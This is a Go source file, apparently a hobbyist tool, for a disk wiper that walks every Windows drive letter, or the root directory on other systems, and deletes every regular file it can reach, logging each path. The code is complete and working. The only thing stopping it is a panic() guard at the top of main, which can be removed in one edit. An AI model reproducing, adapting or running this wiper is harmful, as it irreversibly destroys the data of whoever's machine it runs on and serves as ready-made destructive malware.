package main

/*
 * wiper.go
 * Quick and dirty os.Remove-based wiper
 * By J. Stuart McMurray
 * Created 20180518
 * Last Modified 20180519
 */

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"sync"
)

func main() {
	panic("please don't use this unless you *really* know what you're doing.")

	var wg sync.WaitGroup
	/* If we're using Windows, blow away files from all drives. */
	if "windows" == runtime.GOOS {
		for d := 'A'; d <= 'Z'; d++ {
			wg.Add(1)
			go wipe(fmt.Sprintf(`%c:\`, d), &wg)
		}
	} else {
		/* EVERYBODY else uses / */
		wg.Add(1)
		go wipe("/", &wg)
	}

	/* Wait for wiping to finish. */
	wg.Wait()
	log.Printf("Gefickt.")
}

/* wipe removes everything under path */
func wipe(path string, wg *sync.WaitGroup) {
	defer wg.Done()
	if err := filepath.Walk(
		path,
		func(path string, info os.FileInfo, err error) error {
			/* Skip files we can't access as well as non-regular
			files (e.g. directories). */
			if nil != err || !info.Mode().IsRegular() {
				return nil
			}
			/* Try to remove the file and print the path if we
			succeed */
			if nil == os.RemoveAll(path) {
				log.Printf("%v", path)
			}
			return nil
		},
	); nil != err {
		log.Printf("%v: %v", path, err)
	}
}